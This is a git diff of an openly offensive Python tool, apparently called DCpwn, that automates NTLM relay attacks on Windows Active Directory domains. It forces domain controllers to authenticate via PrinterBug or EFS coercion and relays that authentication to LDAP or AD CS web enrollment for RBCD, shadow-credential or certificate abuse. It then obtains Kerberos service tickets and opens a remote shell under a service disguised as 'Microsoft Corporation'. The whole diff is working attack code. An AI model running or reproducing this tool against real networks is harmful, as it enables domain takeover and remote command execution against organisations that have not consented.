@@ -13,6 +13,14 @@ import string
 from sys import version_info
 from multiprocessing import Manager
 from threading import Thread, Lock 
+from comm import logger
+from comm.ntlmrelayx.attacks import PROTOCOL_ATTACKS
+from comm.ntlmrelayx.utils.config import NTLMRelayxConfig # add AD CS
+from comm.ntlmrelayx.servers import SMBRelayServer
+from comm.trigger.printer import PrinterBug
+from comm.trigger.efs import CoerceAuth
+from comm.ticket.getST import GETST
+from comm.execute.smbexec import CMDEXEC
 from impacket.examples import utils
 from impacket import version
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
@@ -20,15 +28,6 @@ from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
 from minikerberos.network.clientsocket import KerberosClientSocket
 from minikerberos.common.target import KerberosTarget
 from minikerberos.common.ccache import CCACHE
-from comm import logger
-from comm.ntlmrelayx.attacks import PROTOCOL_ATTACKS
-from comm.ticket.gettgtpkinit import myPKINIT
-from comm.ntlmrelayx.utils.config import NTLMRelayxConfig # add AD CS
-from comm.ntlmrelayx.servers import SMBRelayServer
-from comm.trigger.printer import PrinterBug
-from comm.trigger.efs import CoerceAuth
-from comm.ticket.getST import GETST
-from comm.execute.smbexec import CMDEXEC
 
 
 def banner():
@@ -42,11 +41,11 @@ def banner():
    ░▒ ░ ▒░ ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░ ░░   ░▒ ░
    ░░   ░    ░     ░ ░    ░   ▒   ▒ ▒ ░░   ░    ░  
     ░        ░  ░    ░  ░     ░  ░░ ░      ░    ░  
-                                  ░ ░  version: 1.5                                                                                       
+                                  ░ ░  version: 1.6                                                                                       
 """
 	print(banner)
-	print("\n\033[1;33m\t\tNtlmrelay attack \033[0m")
-	print("\tAuthor: evi1cg (zuotonghk@gmail.com)\n")
+	print("\n\033[1;33m\t\tNTLMrelay attack \033[0m")
+	print("\tAuthor: evi1cg (https://twitter.com/evi1cg)\n")
 
 
 
@@ -55,54 +54,54 @@ def startServers(userDomain, userName, password, address, kdc, adcs, callback, o
     start = time.time()
     logging.info("Current attack method is ==> {}".format(options.method.upper()))
     logging.info("Current trigger is  ==> {}".format(options.trigger.upper()))
-    if not options.no_attack:
-        target_dc = kdc
-        PoppedDB		= Manager().dict()	# A dict of PoppedUsers
-        PoppedDB_Lock	= Lock()			# A lock for opening the dict
-        c = NTLMRelayxConfig()
-        target_ldap = "ldap" if options.ldap else "ldaps"
-        c.setProtocolClients(PROTOCOL_CLIENTS)
-        if options.method == "rbcd":
-            c.setTargets(TargetsProcessor(singleTarget=str("{}://{}".format(target_ldap,target_dc)), protocolClients=PROTOCOL_CLIENTS))
-            c.addcomputer = options.add_computer
-            c.dumplaps = False
-            c.dumpgmsa = False
-            c.sid = None
-            c.delegateaccess = True
-            c.escalateuser = userName
-        elif options.method == "sdcd":
-            c.setTargets(TargetsProcessor(singleTarget=str("{}://{}".format(target_ldap,target_dc)), protocolClients=PROTOCOL_CLIENTS))
-            c.addcomputer = options.add_computer
-            c.dumplaps = False
-            c.dumpgmsa = False
-            c.sid = None
-            c.shadowcredential = True
-            c.delegateaccess = False
-            c.kdc = kdc
-            c.userDomain = userDomain
-            c.aclattack = False
-        else:
-            if options.ssl:
-                target = "https://"+adcs+"/certsrv/certfnsh.asp"
+    try:
+        if not options.no_attack:
+            target_dc = kdc
+            c = NTLMRelayxConfig()
+            c.setProtocolClients(PROTOCOL_CLIENTS)
+            target_ldap = "ldap" if options.ldap else "ldaps"
+            if options.method == "rbcd":
+                c.setTargets(TargetsProcessor(singleTarget=str("{}://{}".format(target_ldap,target_dc)), protocolClients=PROTOCOL_CLIENTS))
+                c.addcomputer = options.add_computer
+                c.dumplaps = False
+                c.dumpgmsa = False
+                c.sid = None
+                c.delegateaccess = True
+                c.escalateuser = userName
+            elif options.method == "sdcd":
+                c.setTargets(TargetsProcessor(singleTarget=str("{}://{}".format(target_ldap,target_dc)), protocolClients=PROTOCOL_CLIENTS))
+                c.addcomputer = options.add_computer
+                c.dumplaps = False
+                c.dumpgmsa = False
+                c.sid = None
+                c.shadowcredential = True
+                c.delegateaccess = False
+                c.kdc = kdc
+                c.userDomain = userDomain
+                c.aclattack = False
             else:
-                target = "http://"+adcs+"/certsrv/certfnsh.asp"
-            c.setTargets(TargetsProcessor(singleTarget=str(target), protocolClients=PROTOCOL_CLIENTS))
-            c.setIsADCSAttack(kdc)
-            c.setADCSOptions(options.template)
-        c.setOutputFile(None)
-        c.setEncoding('ascii')
-        c.setMode('RELAY')
-        c.setAttacks(PROTOCOL_ATTACKS)
-        c.setLootdir('.')
-        c.setInterfaceIp("0.0.0.0")
-        c.setExploitOptions(True,False)
-        c.setSMB2Support(True)
-        c.setListeningPort(options.smb_port)
-        c.PoppedDB 		= PoppedDB 		# pass the poppedDB to the relay servers
-        c.PoppedDB_Lock = PoppedDB_Lock # pass the poppedDB to the relay servers
-        s = SMBRelayServer(c)
-        s.start()
-        logging.info("Relay servers started, waiting for connection....")
+                if options.ssl:
+                    target = "https://"+adcs+"/certsrv/certfnsh.asp"
+                else:
+                    target = "http://"+adcs+"/certsrv/certfnsh.asp"
+                c.setTargets(TargetsProcessor(singleTarget=str(target), protocolClients=PROTOCOL_CLIENTS))
+                c.setIsADCSAttack(kdc)
+                c.setADCSOptions(options.template)
+            c.setOutputFile(None)
+            c.setEncoding('ascii')
+            c.setMode('RELAY')
+            c.setAttacks(PROTOCOL_ATTACKS)
+            c.setLootdir('.')
+            c.setInterfaceIp("0.0.0.0")
+            c.setExploitOptions(True,False)
+            c.setSMB2Support(True)
+            c.setListeningPort(options.smb_port)
+            s = SMBRelayServer(c)
+            s.start()
+            logging.info("Relay servers started, waiting for connection....")
+    except Exception as e:
+        logging.error("Error in starting servers: {}".format(e))
+        sys.exit(1)
     try:
         if not options.no_trigger:
             status = exploit(userDomain, userName, password, address, callback, options)
@@ -124,7 +123,7 @@ def startServers(userDomain, userName, password, address, kdc, adcs, callback, o
         elif options.no_attack:
             logging.info("Done.")
         else:
-            logging.error("Error in exploit, Shutting down...")
+            logging.error("Shutting down...")
     except Exception as e:
         logging.info("Shutting down..., error {}".format(e))
     finally:
@@ -177,24 +176,26 @@ def s4u2pwnage(userDomain, kdc, options):
     try:
         executer = GETST(new_username, new_password, domain, options)
         executer.run()
-        ccachefile = config.get_ccache()
-        if os.path.exists(ccachefile):
-            logging.info('Loading ticket..')
-            os.environ['KRB5CCNAME'] = ccachefile
-        else:
-            logger.info("No ticket find. exit..")
-            sys.exit(1)
         try:
-            
-            options.nooutput = False
-            options.mode = "SHARE"
-            options.service_name = "Google"
-            logging.info('Trying to open a shell.')
-            executer = CMDEXEC(options.impersonate, "", domain, options.hashes, options.aesKey, True, kdc,
-                           options.mode, options.share, int(options.rpc_smb_port), options.service_name, options.shell_type, options.codec)
-            executer.run(thostname, options.target_ip)
-            #os.remove(ccachefile)
-            logging.critical("Exit...")
+            if options.shell:
+                ccachefile = config.get_ccache()
+                if os.path.exists(ccachefile):
+                    logging.info('Loading ticket..')
+                    os.environ['KRB5CCNAME'] = ccachefile
+                else:
+                    logger.info("No ticket find. exit..")
+                    sys.exit(1)
+                options.nooutput = False
+                logging.info('Trying to open a shell.')
+                if not options.service_name:
+                    options.service_name = 'Microsoft Corporation'
+                executer = CMDEXEC(options.impersonate, "", domain, options.hashes, options.aesKey, True, kdc,
+                            options.mode, options.share, int(options.rpc_smb_port), options.service_name, options.shell_type, options.codec)
+                executer.run(thostname, options.target_ip)
+                #os.remove(ccachefile)
+                logging.critical("Exit...")
+            else:
+                logging.critical('Execute shell is False, Exiting...')
         except KeyboardInterrupt as e:
             logging.error(str(e))
         except Exception as e:
@@ -211,6 +212,7 @@ def s4u2pwnage(userDomain, kdc, options):
             traceback.print_exc()
 
 def pki2TGT(domain,options):
+    from comm.ticket.gettgtpkinit import myPKINIT
     # Code from  https://github.com/dirkjanm/PKINITtools
     # Static DH params because the ones generated by cryptography are considered unsafe by AD for some weird reason
     dhparams = {
@@ -275,8 +277,7 @@ def check_adcs(url,options):
     return False
     
 
-
-def main():
+def get_args():
     parser = argparse.ArgumentParser(add_help=True,description='DCpwn with ntlmrelay')
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                                        ' (if you want to parse local files)')
@@ -320,25 +321,30 @@ def main():
 
 
     group = parser.add_argument_group('execute')
+    group.add_argument('-shell', action='store_true', help='Launch semi-interactive shell, Default is False')
     group.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$)')
     group.add_argument('-shell-type', action='store', default = 'cmd', choices = ['cmd', 'powershell'], help='choose '
                         'a command processor for the semi-interactive shell')
     group.add_argument('-codec', action='store', default='GBK', help='Sets encoding used (codec) from the target\'s output (default "GBK").')
-    
-
+    group.add_argument('-service-name', action='store', metavar="service_name", help='The name of the'
+                                         'service used to trigger the payload')
+    group.add_argument('-mode', action='store', choices = {'SERVER','SHARE'}, default='SHARE',
+                        help='mode to use (default SHARE, SERVER needs root!)')
     if len(sys.argv)==1:
         parser.print_help()
         sys.exit(1)
 
+    return parser
 
-    options = parser.parse_args()
+def main():
+    banner()
+    options = get_args().parse_args()
     logger.init(options.ts)
     if options.debug is True:
         logging.getLogger().setLevel(logging.DEBUG)
         logging.debug(version.getInstallationPath())
     else:
         logging.getLogger().setLevel(logging.INFO)
-
 
     userDomain, userName, password, address = utils.parse_target(options.target)
 
@@ -385,5 +391,4 @@ def main():
     startServers(userDomain, userName, password, address, kdc, adcs, callback, options)
 
 if __name__ == '__main__':
-    banner()
     main()
